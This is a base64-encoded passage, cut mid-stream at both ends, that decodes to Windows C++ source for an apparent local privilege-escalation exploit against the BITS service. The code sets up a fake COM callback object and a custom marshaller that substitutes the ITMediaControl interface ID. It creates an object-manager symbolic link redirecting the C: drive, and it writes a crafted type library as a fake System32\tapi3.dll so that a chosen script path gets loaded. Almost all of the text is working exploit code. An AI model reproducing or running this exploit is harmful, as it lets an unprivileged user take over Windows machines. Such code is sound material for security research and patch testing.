kJLyogW2Fubm90YXRpb25dW291dF0gKi8NCgkJX091dF8gIERXT1JEICpwU2l6ZSkNCgl7DQoJCSpwU2l6ZSA9IDEwMjQ7DQoJCXJldHVybiBTX09LOw0KCX0NCg0KCXZpcnR1YWwgSFJFU1VMVCBTVERNRVRIT0RDQUxMVFlQRSBNYXJzaGFsSW50ZXJmYWNlKA0KCQkvKiBbYW5ub3RhdGlvbl1bdW5pcXVlXVtpbl0gKi8NCgkJX0luXyAgSVN0cmVhbSAqcFN0bSwNCgkJLyogW2Fubm90YXRpb25dW2luXSAqLw0KCQlfSW5fICBSRUZJSUQgcmlpZCwNCgkJLyogW2Fubm90YXRpb25dW3VuaXF1ZV1baW5dICovDQoJCV9Jbl9vcHRfICB2b2lkICpwdiwNCgkJLyogW2Fubm90YXRpb25dW2luXSAqLw0KCQlfSW5fICBEV09SRCBkd0Rlc3RDb250ZXh0LA0KCQkvKiBbYW5ub3RhdGlvbl1bdW5pcXVlXVtpbl0gKi8NCgkJX1Jlc2VydmVkXyAgdm9pZCAqcHZEZXN0Q29udGV4dCwNCgkJLyogW2Fubm90YXRpb25dW2luXSAqLw0KCQlfSW5fICBEV09SRCBtc2hsZmxhZ3MpDQoJew0KCQlwcmludGYoIk1hcnNoYWwgSW50ZXJmYWNlOiAlbHNcbiIsIElJRFRvQlNUUihyaWlkKS5HZXRCU1RSKCkpOw0KCQlJSUQgaWlkID0gcmlpZDsNCgkJaWYgKGlpZCA9PSBfX3V1aWRvZihJQmFja2dyb3VuZENvcHlDYWxsYmFjazIpIHx8IGlpZCA9PSBfX3V1aWRvZihJQmFja2dyb3VuZENvcHlDYWxsYmFjaykpDQoJCXsNCgkJCXByaW50ZigiU2V0dGluZyBiYWQgSUlEXG4iKTsNCgkJCWlpZCA9IElJRF9JVE1lZGlhQ29udHJvbDsNCgkJfQ0KCQlIUkVTVUxUIGhyID0gQ29NYXJzaGFsSW50ZXJmYWNlKHBTdG0sIGlpZCwgX3VuaywgZHdEZXN0Q29udGV4dCwgcHZEZXN0Q29udGV4dCwgbXNobGZsYWdzKTsNCgkJcHJpbnRmKCJNYXJzaGFsIENvbXBsZXRlOiAlMDhYXG4iLCBocik7DQoJCXJldHVybiBocjsNCgl9DQoNCgl2aXJ0dWFsIEhSRVNVTFQgU1RETUVUSE9EQ0FMTFRZUEUgVW5tYXJzaGFsSW50ZXJmYWNlKA0KCQkvKiBbYW5ub3RhdGlvbl1bdW5pcXVlXVtpbl0gKi8NCgkJX0luXyAgSVN0cmVhbSAqcFN0bSwNCgkJLyogW2Fubm90YXRpb25dW2luXSAqLw0KCQlfSW5fICBSRUZJSUQgcmlpZCwNCgkJLyogW2Fubm90YXRpb25dW291dF0gKi8NCgkJX091dHB0cl8gIHZvaWQgKipwcHYpDQoJew0KCQlyZXR1cm4gRV9OT1RJTVBMOw0KCX0NCg0KCXZpcnR1YWwgSFJFU1VMVCBTVERNRVRIT0RDQUxMVFlQRSBSZWxlYXNlTWFyc2hhbERhdGEoDQoJCS8qIFthbm5vdGF0aW9uXVt1bmlxdWVdW2luXSAqLw0KCQlfSW5fICBJU3RyZWFtICpwU3RtKQ0KCXsNCgkJcmV0dXJuIFNfT0s7DQoJfQ0KDQoJdmlydHVhbCBIUkVTVUxUIFNURE1FVEhPRENBTExUWVBFIERpc2Nvbm5lY3RPYmplY3QoDQoJCS8qIFthbm5vdGF0aW9uXVtpbl0gKi8NCgkJX0luXyAgRFdPUkQgZHdSZXNlcnZlZCkNCgl7DQoJCXJldHVybiBTX09LOw0KCX0NCn07DQoNCmNsYXNzIEZha2VPYmplY3QgOiBwdWJsaWMgSUJhY2tncm91bmRDb3B5Q2FsbGJhY2syLCBwdWJsaWMgSVBlcnNpc3QNCnsNCglMT05HIG1fbFJlZkNvdW50Ow0KDQoJfkZha2VPYmplY3QoKSB7fTsNCg0KcHVibGljOg0KCS8vQ29uc3RydWN0b3IsIERlc3RydWN0b3INCglGYWtlT2JqZWN0KCkgew0KCQltX2xSZWZDb3VudCA9IDE7DQoJfQ0KDQoJLy9JVW5rbm93bg0KCUhSRVNVTFQgX19zdGRjYWxsIFF1ZXJ5SW50ZXJmYWNlKFJFRklJRCByaWlkLCBMUFZPSUQgKnBwdk9iaikNCgl7DQoJCWlmIChyaWlkID09IF9fdXVpZG9mKElVbmtub3duKSkNCgkJew0KCQkJcHJpbnRmKCJRdWVyeSBmb3IgSVVua25vd25cbiIpOw0KCQkJKnBwdk9iaiA9IHRoaXM7DQoJCX0NCgkJZWxzZSBpZiAocmlpZCA9PSBfX3V1aWRvZihJQmFja2dyb3VuZENvcHlDYWxsYmFjazIpKQ0KCQl7DQoJCQlwcmludGYoIlF1ZXJ5IGZvciBJQmFja2dyb3VuZENvcHlDYWxsYmFjazJcbiIpOw0KCQkJKnBwdk9iaiA9IHN0YXRpY19jYXN0PElCYWNrZ3JvdW5kQ29weUNhbGxiYWNrMio+KHRoaXMpOw0KCQl9DQoJCWVsc2UgaWYgKHJpaWQgPT0gX191dWlkb2YoSUJhY2tncm91bmRDb3B5Q2FsbGJhY2spKQ0KCQl7DQoJCQlwcmludGYoIlF1ZXJ5IGZvciBJQmFja2dyb3VuZENvcHlDYWxsYmFja1xuIik7DQoJCQkqcHB2T2JqID0gc3RhdGljX2Nhc3Q8SUJhY2tncm91bmRDb3B5Q2FsbGJhY2sqPih0aGlzKTsNCgkJfQ0KCQllbHNlIGlmIChyaWlkID09IF9fdXVpZG9mKElQZXJzaXN0KSkNCgkJew0KCQkJcHJpbnRmKCJRdWVyeSBmb3IgSVBlcnNpc3RcbiIpOw0KCQkJKnBwdk9iaiA9IHN0YXRpY19jYXN0PElQZXJzaXN0Kj4odGhpcyk7DQoJCX0NCgkJZWxzZSBpZiAocmlpZCA9PSBJSURfSVRNZWRpYUNvbnRyb2wpDQoJCXsNCgkJCXByaW50ZigiUXVlcnkgZm9yIElUTWVkaWFDb250cm9sXG4iKTsNCgkJCSpwcHZPYmogPSBzdGF0aWNfY2FzdDxJUGVyc2lzdCo+KHRoaXMpOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJcHJpbnRmKCJVbmtub3duIElJRDogJWxzICVwXG4iLCBJSURUb0JTVFIocmlpZCkuR2V0QlNUUigpLCB0aGlzKTsNCgkJCSpwcHZPYmogPSBOVUxMOw0KCQkJcmV0dXJuIEVfTk9JTlRFUkZBQ0U7DQoJCX0NCg0KCQkoKElVbmtub3duKikqcHB2T2JqKS0+QWRkUmVmKCk7DQoJCXJldHVybiBOT0VSUk9SOw0KCX0NCg0KCVVMT05HIF9fc3RkY2FsbCBBZGRSZWYoKQ0KCXsNCgkJcmV0dXJuIEludGVybG9ja2VkSW5jcmVtZW50KCZtX2xSZWZDb3VudCk7DQoJfQ0KDQoJVUxPTkcgX19zdGRjYWxsIFJlbGVhc2UoKQ0KCXsNCgkJVUxPTkcgIHVsQ291bnQgPSBJbnRlcmxvY2tlZERlY3JlbWVudCgmbV9sUmVmQ291bnQpOw0KDQoJCWlmICgwID09IHVsQ291bnQpDQoJCXsNCgkJCWRlbGV0ZSB0aGlzOw0KCQl9DQoNCgkJcmV0dXJuIHVsQ291bnQ7DQoJfQ0KDQoJdmlydHVhbCBIUkVTVUxUIFNURE1FVEhPRENBTExUWVBFIEpvYlRyYW5zZmVycmVkKA0KCQkvKiBbaW5dICovIF9fUlBDX19pbl9vcHQgSUJhY2tncm91bmRDb3B5Sm9iICpwSm9iKQ0KCXsNCgkJcHJpbnRmKCJKb2JUcmFuc2ZlcnJlZFxuIik7DQoJCXJldHVybiBTX09LOw0KCX0NCg0KCXZpcnR1YWwgSFJFU1VMVCBTVERNRVRIT0RDQUxMVFlQRSBKb2JFcnJvcigNCgkJLyogW2luXSAqLyBfX1JQQ19faW5fb3B0IElCYWNrZ3JvdW5kQ29weUpvYiAqcEpvYiwNCgkJLyogW2luXSAqLyBfX1JQQ19faW5fb3B0IElCYWNrZ3JvdW5kQ29weUVycm9yICpwRXJyb3IpDQoJew0KCQlwcmludGYoIkpvYkVycm9yXG4iKTsNCgkJcmV0dXJuIFNfT0s7DQoJfQ0KDQoNCgl2aXJ0dWFsIEhSRVNVTFQgU1RETUVUSE9EQ0FMTFRZUEUgSm9iTW9kaWZpY2F0aW9uKA0KCQkvKiBbaW5dICovIF9fUlBDX19pbl9vcHQgSUJhY2tncm91bmRDb3B5Sm9iICpwSm9iLA0KCQkvKiBbaW5dICovIERXT1JEIGR3UmVzZXJ2ZWQpDQoJew0KCQlwcmludGYoIkpvYk1vZGlmaWNhdGlvblxuIik7DQoJCXJldHVybiBTX09LOw0KCX0NCg0KDQoJdmlydHVhbCBIUkVTVUxUIFNURE1FVEhPRENBTExUWVBFIEZpbGVUcmFuc2ZlcnJlZCgNCgkJLyogW2luXSAqLyBfX1JQQ19faW5fb3B0IElCYWNrZ3JvdW5kQ29weUpvYiAqcEpvYiwNCgkJLyogW2luXSAqLyBfX1JQQ19faW5fb3B0IElCYWNrZ3JvdW5kQ29weUZpbGUgKnBGaWxlKQ0KCXsNCgkJcHJpbnRmKCJGaWxlVHJhbnNmZXJyZWRcbiIpOw0KCQlyZXR1cm4gU19PSzsNCgl9DQoNCgl2aXJ0dWFsIEhSRVNVTFQgU1RETUVUSE9EQ0FMTFRZUEUgR2V0Q2xhc3NJRCgNCgkJLyogW291dF0gKi8gX19SUENfX291dCBDTFNJRCAqcENsYXNzSUQpDQoJew0KCQkqcENsYXNzSUQgPSBHVUlEX05VTEw7DQoJCXJldHVybiBTX09LOw0KCX0NCn07DQoNCl9DT01fU01BUlRQVFJfVFlQRURFRihJQmFja2dyb3VuZENvcHlKb2IsIF9fdXVpZG9mKElCYWNrZ3JvdW5kQ29weUpvYikpOw0KX0NPTV9TTUFSVFBUUl9UWVBFREVGKElCYWNrZ3JvdW5kQ29weU1hbmFnZXIsIF9fdXVpZG9mKElCYWNrZ3JvdW5kQ29weU1hbmFnZXIpKTsNCg0Kc3RhdGljIEhSRVNVTFQgQ2hlY2soSFJFU1VMVCBocikNCnsNCglpZiAoRkFJTEVEKGhyKSkNCgl7DQoJCXRocm93IF9jb21fZXJyb3IoaHIpOw0KCX0NCglyZXR1cm4gaHI7DQp9DQoNCiNkZWZpbmUgU1lNQk9MSUNfTElOS19BTExfQUNDRVNTIChTVEFOREFSRF9SSUdIVFNfUkVRVUlSRUQgfCAweDEpDQoNCnR5cGVkZWYgTlRTVEFUVVMoTlRBUEkqIGZOdENyZWF0ZVN5bWJvbGljTGlua09iamVjdCkoUEhBTkRMRSBMaW5rSGFuZGxlLCBBQ0NFU1NfTUFTSyBEZXNpcmVkQWNjZXNzLCBQT0JKRUNUX0FUVFJJQlVURVMgT2JqZWN0QXR0cmlidXRlcywgUFVOSUNPREVfU1RSSU5HIFRhcmdldE5hbWUpOw0KdHlwZWRlZiBWT0lEKE5UQVBJICpmUnRsSW5pdFVuaWNvZGVTdHJpbmcpKFBVTklDT0RFX1NUUklORyBEZXN0aW5hdGlvblN0cmluZywgUENXU1RSIFNvdXJjZVN0cmluZyk7DQoNCkZBUlBST0MgR2V0UHJvY0FkZHJlc3NOVChMUENTVFIgbHBOYW1lKQ0Kew0KCXJldHVybiBHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGVXKEwibnRkbGwiKSwgbHBOYW1lKTsNCn0NCg0KDQpjbGFzcyBTY29wZWRIYW5kbGUNCnsNCglIQU5ETEUgX2g7DQpwdWJsaWM6DQoJU2NvcGVkSGFuZGxlKCkgOiBfaChudWxscHRyKQ0KCXsNCgl9DQoNCglTY29wZWRIYW5kbGUoU2NvcGVkSGFuZGxlJikgPSBkZWxldGU7DQoNCglTY29wZWRIYW5kbGUoU2NvcGVkSGFuZGxlJiYgaCkgew0KCQlfaCA9IGguX2g7DQoJCWguX2ggPSBudWxscHRyOw0KCX0NCg0KCX5TY29wZWRIYW5kbGUoKQ0KCXsNCgkJaWYgKCFpbnZhbGlkKCkpDQoJCXsNCgkJCUNsb3NlSGFuZGxlKF9oKTsNCgkJCV9oID0gbnVsbHB0cjsNCgkJfQ0KCX0NCg0KCWJvb2wgaW52YWxpZCgpIHsNCgkJcmV0dXJuIChfaCA9PSBudWxscHRyKSB8fCAoX2ggPT0gSU5WQUxJRF9IQU5ETEVfVkFMVUUpOw0KCX0NCg0KCXZvaWQgc2V0KEhBTkRMRSBoKQ0KCXsNCgkJX2ggPSBoOw0KCX0NCg0KCUhBTkRMRSBnZXQoKQ0KCXsNCgkJcmV0dXJuIF9oOw0KCX0NCg0KCUhBTkRMRSogcHRyKCkNCgl7DQoJCXJldHVybiAmX2g7DQoJfQ0KDQoNCn07DQoNClNjb3BlZEhhbmRsZSBDcmVhdGVTeW1saW5rKExQQ1dTVFIgbGlua25hbWUsIExQQ1dTVFIgdGFyZ2V0bmFtZSkNCnsNCglmUnRsSW5pdFVuaWNvZGVTdHJpbmcgcGZSdGxJbml0VW5pY29kZVN0cmluZyA9IChmUnRsSW5pdFVuaWNvZGVTdHJpbmcpR2V0UHJvY0FkZHJlc3NOVCgiUnRsSW5pdFVuaWNvZGVTdHJpbmciKTsNCglmTnRDcmVhdGVTeW1ib2xpY0xpbmtPYmplY3QgcGZOdENyZWF0ZVN5bWJvbGljTGlua09iamVjdCA9IChmTnRDcmVhdGVTeW1ib2xpY0xpbmtPYmplY3QpR2V0UHJvY0FkZHJlc3NOVCgiTnRDcmVhdGVTeW1ib2xpY0xpbmtPYmplY3QiKTsNCg0KCU9CSkVDVF9BVFRSSUJVVEVTIG9iakF0dHI7DQoJVU5JQ09ERV9TVFJJTkcgbmFtZTsNCglVTklDT0RFX1NUUklORyB0YXJnZXQ7DQoNCglwZlJ0bEluaXRVbmljb2RlU3RyaW5nKCZuYW1lLCBsaW5rbmFtZSk7DQoJcGZSdGxJbml0VW5pY29kZVN0cmluZygmdGFyZ2V0LCB0YXJnZXRuYW1lKTsNCg0KCUluaXRpYWxpemVPYmplY3RBdHRyaWJ1dGVzKCZvYmpBdHRyLCAmbmFtZSwgT0JKX0NBU0VfSU5TRU5TSVRJVkUsIG51bGxwdHIsIG51bGxwdHIpOw0KDQoJU2NvcGVkSGFuZGxlIGhMaW5rOw0KDQoJTlRTVEFUVVMgc3RhdHVzID0gcGZOdENyZWF0ZVN5bWJvbGljTGlua09iamVjdChoTGluay5wdHIoKSwgU1lNQk9MSUNfTElOS19BTExfQUNDRVNTLCAmb2JqQXR0ciwgJnRhcmdldCk7DQoJaWYgKHN0YXR1cyA9PSAwKQ0KCXsNCgkJcHJpbnRmKCJPcGVuZWQgTGluayAlbHMgLT4gJWxzOiAlcFxuIiwgbGlua25hbWUsIHRhcmdldG5hbWUsIGhMaW5rLmdldCgpKTsNCgkJcmV0dXJuIGhMaW5rOw0KCX0NCgllbHNlDQoJew0KCQlwcmludGYoIkVycm9yIGNyZWF0aW5nIGxpbmsgJWxzOiAlMDhYXG4iLCBsaW5rbmFtZSwgc3RhdHVzKTsNCgkJcmV0dXJuIFNjb3BlZEhhbmRsZSgpOw0KCX0NCn0NCg0KDQpic3RyX3QgR2V0U3lzdGVtRHJpdmUoKQ0Kew0KCVdDSEFSIHdpbmRvd3NfZGlyW01BWF9QQVRIXSA9IHsgMCB9Ow0KDQoJR2V0V2luZG93c0RpcmVjdG9yeSh3aW5kb3dzX2RpciwgTUFYX1BBVEgpOw0KDQoJd2luZG93c19kaXJbMl0gPSAwOw0KDQoJcmV0dXJuIHdpbmRvd3NfZGlyOw0KfQ0KDQpic3RyX3QgR2V0RGV2aWNlRnJvbVBhdGgoTFBDV1NUUiBscFBhdGgpDQp7DQoJV0NIQVIgZHJpdmVbM10gPSB7IDAgfTsNCglkcml2ZVswXSA9IGxwUGF0aFswXTsNCglkcml2ZVsxXSA9IGxwUGF0aFsxXTsNCglkcml2ZVsyXSA9IDA7DQoNCglXQ0hBUiBkZXZpY2VfbmFtZVtNQVhfUEFUSF0gPSB7IDAgfTsNCg0KCWlmIChRdWVyeURvc0RldmljZShkcml2ZSwgZGV2aWNlX25hbWUsIE1BWF9QQVRIKSkNCgl7DQoJCXJldHVybiBkZXZpY2VfbmFtZTsNCgl9DQoJZWxzZQ0KCXsNCgkJcHJpbnRmKCJFcnJvciBnZXR0aW5nIGRldmljZSBmb3IgJWxzXG4iLCBscFBhdGgpOw0KCQlleGl0KDEpOw0KCX0NCn0NCg0KYnN0cl90IEdldFN5c3RlbURldmljZSgpDQp7DQoJcmV0dXJuIEdldERldmljZUZyb21QYXRoKEdldFN5c3RlbURyaXZlKCkpOw0KfQ0KDQpic3RyX3QgR2V0RXhlKCkNCnsNCglXQ0hBUiBjdXJyX3BhdGhbTUFYX1BBVEhdID0geyAwIH07DQoJR2V0TW9kdWxlRmlsZU5hbWUobnVsbHB0ciwgY3Vycl9wYXRoLCBNQVhfUEFUSCk7DQoJcmV0dXJuIGN1cnJfcGF0aDsNCn0NCg0KYnN0cl90IEdldEV4ZURpcigpDQp7DQoJV0NIQVIgY3Vycl9wYXRoW01BWF9QQVRIXSA9IHsgMCB9Ow0KCUdldE1vZHVsZUZpbGVOYW1lKG51bGxwdHIsIGN1cnJfcGF0aCwgTUFYX1BBVEgpOw0KCVBhdGhSZW1vdmVGaWxlU3BlYyhjdXJyX3BhdGgpOw0KDQoJcmV0dXJuIGN1cnJfcGF0aDsNCn0NCg0KYnN0cl90IEdldEN1cnJlbnRQYXRoKCkNCnsNCglic3RyX3QgY3Vycl9wYXRoID0gR2V0RXhlRGlyKCk7DQoNCglic3RyX3QgcmV0ID0gR2V0RGV2aWNlRnJvbVBhdGgoY3Vycl9wYXRoKTsNCg0KCXJldCArPSAmY3Vycl9wYXRoLkdldEJTVFIoKVsyXTsNCg0KCXJldHVybiByZXQ7DQp9DQoNCnZvaWQgVGVzdEJpdHMoKQ0Kew0KCUlCYWNrZ3JvdW5kQ29weU1hbmFnZXJQdHIgcFF1ZXVlTWdyOw0KDQoJQ2hlY2soQ29DcmVhdGVJbnN0YW5jZShfX3V1aWRvZihCYWNrZ3JvdW5kQ29weU1hbmFnZXIpLCBOVUxMLA0KCQlDTFNDVFhfTE9DQUxfU0VSVkVSLCBJSURfUFBWX0FSR1MoJnBRdWV1ZU1ncikpKTsNCg0KCUlVbmtub3duUHRyIHBPdXRlciA9IG5ldyBDTWFyc2hhbGxlcihzdGF0aWNfY2FzdDxJUGVyc2lzdCo+KG5ldyBGYWtlT2JqZWN0KCkpKTsNCglJVW5rbm93blB0ciBwSW5uZXI7DQoNCglDaGVjayhDb0dldFN0ZE1hcnNoYWxFeChwT3V0ZXIsIFNNRVhGX1NFUlZFUiwgJnBJbm5lcikpOw0KDQoJSUJhY2tncm91bmRDb3B5Sm9iUHRyIHBKb2I7DQoJR1VJRCBndWlkSm9iOw0KCUNoZWNrKHBRdWV1ZU1nci0+Q3JlYXRlSm9iKEwiQml0c0F1dGhTYW1wbGUiLA0KCQlCR19KT0JfVFlQRV9ET1dOTE9BRCwNCgkJJmd1aWRKb2IsDQoJCSZwSm9iKSk7DQoJDQoJSVVua25vd25QdHIgcE5vdGlmeTsNCglwTm90aWZ5LkF0dGFjaChuZXcgQ01hcnNoYWxsZXIocElubmVyKSk7DQoJew0KCQlTY29wZWRIYW5kbGUgbGluayA9IENyZWF0ZVN5bWxpbmsoTCJcXD8/XFxDOiIsIEdldEN1cnJlbnRQYXRoKCkpOw0KCQlwcmludGYoIlJlc3VsdDogJTA4WFxuIiwgcEpvYi0+U2V0Tm90aWZ5SW50ZXJmYWNlKHBOb3RpZnkpKTsNCgl9DQoJaWYgKHBKb2IpDQoJew0KCQlwSm9iLT5DYW5jZWwoKTsNCgl9DQoJcHJpbnRmKCJEb25lXG4iKTsNCn0NCg0KY2xhc3MgQ29Jbml0DQp7DQpwdWJsaWM6DQoJQ29Jbml0KCkNCgl7DQoJCUNoZWNrKENvSW5pdGlhbGl6ZShudWxscHRyKSk7DQoJCUNoZWNrKENvSW5pdGlhbGl6ZVNlY3VyaXR5KG51bGxwdHIsIC0xLCBudWxscHRyLCBudWxscHRyLA0KCQkJUlBDX0NfQVVUSE5fTEVWRUxfREVGQVVMVCwgUlBDX0NfSU1QX0xFVkVMX0lNUEVSU09OQVRFLCBudWxscHRyLCBFT0FDX05PX0NVU1RPTV9NQVJTSEFMIHwgRU9BQ19EWU5BTUlDX0NMT0FLSU5HLCBudWxscHRyKSk7DQoJfQ0KDQoJfkNvSW5pdCgpDQoJew0KCQlDb1VuaW5pdGlhbGl6ZSgpOw0KCX0NCn07DQoNCi8vIHtENDg3Nzg5Qy0zMkEzLTRFMjItQjQ2QS1DNEM0QzFDMkQzRTB9DQpzdGF0aWMgY29uc3QgR1VJRCBJSURfQmFzZUludGVyZmFjZSA9DQp7IDB4ZDQ4Nzc4OWMsIDB4MzJhMywgMHg0ZTIyLHsgMHhiNCwgMHg2YSwgMHhjNCwgMHhjNCwgMHhjMSwgMHhjMiwgMHhkMywgMHhlMCB9IH07DQoNCi8vIHs2QzZDOUYzMy1BRTg4LTRFQzItQkUyRC00NDlBMEZGRjhDMDJ9DQpzdGF0aWMgY29uc3QgR1VJRCBUeXBlTGliX0Jhc2VJbnRlcmZhY2UgPQ0KeyAweDZjNmM5ZjMzLCAweGFlODgsIDB4NGVjMix7IDB4YmUsIDB4MmQsIDB4NDQsIDB4OWEsIDB4ZiwgMHhmZiwgMHg4YywgMHgyIH0gfTsNCg0KR1VJRCBUeXBlTGliX1RhcGkzID0geyAweDIxZDZkNDgwLDB4YTg4YiwweDExZDAseyAweDgzLDB4ZGQsMHgwMCwweGFhLDB4MDAsMHgzYywweGNhLDB4YmQgfSB9Ow0KDQp2b2lkIENyZWF0ZShic3RyX3QgZmlsZW5hbWUsIGJzdHJfdCBpZl9uYW1lLCBSRUZHVUlEIHR5cGVsaWJfZ3VpZCwgUkVGR1VJRCBpaWQsIElUeXBlTGliKiByZWZfdHlwZWxpYiwgUkVGR1VJRCByZWZfaWlkKQ0Kew0KCURlbGV0ZUZpbGUoZmlsZW5hbWUpOw0KCUlDcmVhdGVUeXBlTGliMlB0ciB0bGI7DQoJQ2hlY2soQ3JlYXRlVHlwZUxpYjIoU1lTX1dJTjMyLCBmaWxlbmFtZSwgJnRsYikpOw0KCXRsYi0+U2V0R3VpZCh0eXBlbGliX2d1aWQpOw0KDQoJSVR5cGVJbmZvUHRyIHJlZl90eXBlX2luZm87DQoJQ2hlY2socmVmX3R5cGVsaWItPkdldFR5cGVJbmZvT2ZHdWlkKHJlZl9paWQsICZyZWZfdHlwZV9pbmZvKSk7DQoNCglJQ3JlYXRlVHlwZUluZm9QdHIgY3JlYXRlX2luZm87DQoJQ2hlY2sodGxiLT5DcmVhdGVUeXBlSW5mbyhpZl9uYW1lLCBUS0lORF9JTlRFUkZBQ0UsICZjcmVhdGVfaW5mbykpOw0KCUNoZWNrKGNyZWF0ZV9pbmZvLT5TZXRUeXBlRmxhZ3MoVFlQRUZMQUdfRkRVQUwgfCBUWVBFRkxBR19GT0xFQVVUT01BVElPTikpOw0KCUhSRUZUWVBFIHJlZl90eXBlOw0KCUNoZWNrKGNyZWF0ZV9pbmZvLT5BZGRSZWZUeXBlSW5mbyhyZWZfdHlwZV9pbmZvLCAmcmVmX3R5cGUpKTsNCglDaGVjayhjcmVhdGVfaW5mby0+QWRkSW1wbFR5cGUoMCwgcmVmX3R5cGUpKTsNCglDaGVjayhjcmVhdGVfaW5mby0+U2V0R3VpZChpaWQpKTsNCglDaGVjayh0bGItPlNhdmVBbGxDaGFuZ2VzKCkpOw0KfQ0KDQpzdGQ6OnZlY3RvcjxCWVRFPiBSZWFkRmlsZShic3RyX3QgcGF0aCkNCnsNCglTY29wZWRIYW5kbGUgaEZpbGU7DQoJaEZpbGUuc2V0KENyZWF0ZUZpbGUocGF0aCwgR0VORVJJQ19SRUFELCAwLCBudWxscHRyLCBPUEVOX0VYSVNUSU5HLCAwLCBudWxscHRyKSk7DQoJaWYgKGhGaWxlLmludmFsaWQoKSkNCgl7DQoJCXRocm93IF9jb21fZXJyb3IoRV9GQUlMKTsNCgl9CQ0KCURXT1JEIHNpemUgPSBHZXRGaWxlU2l6ZShoRmlsZS5nZXQoKSwgbnVsbHB0cik7DQoJc3RkOjp2ZWN0b3I8QllURT4gcmV0KHNpemUpOw0KCWlmIChzaXplID4gMCkNCgl7DQoJCURXT1JEIGJ5dGVzX3JlYWQ7DQoJCWlmICghUmVhZEZpbGUoaEZpbGUuZ2V0KCksIHJldC5kYXRhKCksIHNpemUsICZieXRlc19yZWFkLCBudWxscHRyKSB8fCBieXRlc19yZWFkICE9IHNpemUpDQoJCXsNCgkJCXRocm93IF9jb21fZXJyb3IoRV9GQUlMKTsNCgkJfQ0KCX0NCgkNCglyZXR1cm4gcmV0Ow0KfQ0KDQp2b2lkIFdyaXRlRmlsZShic3RyX3QgcGF0aCwgY29uc3Qgc3RkOjp2ZWN0b3I8QllURT4gZGF0YSkNCnsNCglTY29wZWRIYW5kbGUgaEZpbGU7DQoJaEZpbGUuc2V0KENyZWF0ZUZpbGUocGF0aCwgR0VORVJJQ19XUklURSwgMCwgbnVsbHB0ciwgQ1JFQVRFX0FMV0FZUywgMCwgbnVsbHB0cikpOw0KCWlmIChoRmlsZS5pbnZhbGlkKCkpDQoJew0KCQl0aHJvdyBfY29tX2Vycm9yKEVfRkFJTCk7DQoJfQ0KCQ0KCWlmIChkYXRhLnNpemUoKSA+IDApDQoJew0KCQlEV09SRCBieXRlc193cml0dGVuOw0KCQlpZiAoIVdyaXRlRmlsZShoRmlsZS5nZXQoKSwgZGF0YS5kYXRhKCksIGRhdGEuc2l6ZSgpLCAmYnl0ZXNfd3JpdHRlbiwgbnVsbHB0cikgfHwgYnl0ZXNfd3JpdHRlbiAhPSBkYXRhLnNpemUoKSkNCgkJew0KCQkJdGhyb3cgX2NvbV9lcnJvcihFX0ZBSUwpOw0KCQl9DQoJfQ0KfQ0KDQp2b2lkIFdyaXRlRmlsZShic3RyX3QgcGF0aCwgY29uc3QgY2hhciogZGF0YSkNCnsNCgljb25zdCBCWVRFKiBieXRlcyA9IHJlaW50ZXJwcmV0X2Nhc3Q8Y29uc3QgQllURSo+KGRhdGEpOw0KCXN0ZDo6dmVjdG9yPEJZVEU+IGRhdGFfYnVmKGJ5dGVzLCBieXRlcyArIHN0cmxlbihkYXRhKSk7DQoJV3JpdGVGaWxlKHBhdGgsIGRhdGFfYnVmKTsNCn0NCg0Kdm9pZCBCdWlsZFR5cGVMaWJzKExQQ1NUUiBzY3JpcHRfcGF0aCkNCnsNCglJVHlwZUxpYlB0ciBzdGRvbGUyOw0KCUNoZWNrKExvYWRUeXBlTGliKEwic3Rkb2xlMi50bGIiLCAmc3Rkb2xlMikpOw0KDQoJcHJpbnRmKCJCdWlsZGluZyBMaWJyYXJ5IHdpdGggcGF0aDogJXNcbiIsIHNjcmlwdF9wYXRoKTsNCgl1bnNpZ25lZCBpbnQgbGVuID0gc3RybGVuKHNjcmlwdF9wYXRoKTsNCg0KCWJzdHJfdCBidWYgPSBHZXRFeGVEaXIoKSArIEwiXFwiOw0KCWZvciAodW5zaWduZWQgaW50IGkgPSAwOyBpIDwgbGVuOyArK2kpDQoJew0KCQlidWYgKz0gTCJBIjsNCgl9DQoNCglDcmVhdGUoYnVmLCAiSUJhZGdlciIsIFR5cGVMaWJfQmFzZUludGVyZmFjZSwgSUlEX0Jhc2VJbnRlcmZhY2UsIHN0ZG9sZTIsIElJRF9JRGlzcGF0Y2gpOw0KCUlUeXBlTGliUHRyIGFiYzsNCglDaGVjayhMb2FkVHlwZUxpYihidWYsICZhYmMpKTsNCg0KDQoJYnN0cl90IGJ1aWx0X3RsYiA9IEdldEV4ZURpcigpICsgTCJcXG91dHB1dC50bGIiOw0KCUNyZWF0ZShidWlsdF90bGIsICJJVE1lZGlhQ29udHJvbCIsIFR5cGVMaWJfVGFwaTMsIElJRF9JVE1lZGlhQ29udHJvbCwgYWJjLCBJSURfQmFzZUludGVyZmFjZSk7DQoNCglzdGQ6OnZlY3RvcjxCWVRFPiB0bGJfZGF0YSA9IFJlYWRGaWxlKGJ1aWx0X3RsYik7DQoJZm9yIChzaXplX3QgaSA9IDA7IGkgPCB0bGJfZGF0YS5zaXplKCkgLSBsZW47ICsraSkNCgl7DQoJCWJvb2wgZm91bmQgPSB0cnVlOw0KCQlmb3IgKHVuc2lnbmVkIGludCBqID0gMDsgaiA8IGxlbjsgaisrKQ0KCQl7DQoJCQlpZiAodGxiX2RhdGFbaSArIGpdICE9ICdBJykNCgkJCXsNCgkJCQlmb3VuZCA9IGZhbHNlOw0KCQkJfQ0KCQl9DQoNCgkJaWYgKGZvdW5kKQ0KCQl7DQoJCQlwcmludGYoIkZvdW5kIFRMQiBuYW1lIGF0IG9mZnNldCAlenVcbiIsIGkpOw0KCQkJbWVtY3B5KCZ0bGJfZGF0YVtpXSwgc2NyaXB0X3BhdGgsIGxlbik7DQoJCQlicmVhazsNCgkJfQ0KCX0NCg0KCUNyZWF0ZURpcmVjdG9yeShHZXRFeGVEaXIoKSArIEwiXFxXaW5kb3dzIiwgbnVsbHB0cik7DQoJQ3JlYXRlRGlyZWN0b3J5KEdldEV4ZURpcigpICsgTCJcXFdpbmRvd3NcXFN5c3RlbTMyIiwgbnVsbHB0cik7DQoNCglic3RyX3QgdGFyZ2V0X3RsYiA9IEdldEV4ZURpcigpICsgTCJcXFdpbmRvd3NcXHN5c3RlbTMyXFx0YXBpMy5kbGwiOw0KCVdyaXRlRmlsZSh0YXJnZXRfdGxiLCB0bGJfZGF0YSk7DQp9DQoNCmNvbnN0IHdjaGFyX3QgeFtdID0gTCJBQkMiOw0KDQpjb25zdCB3Y2hhcl90IH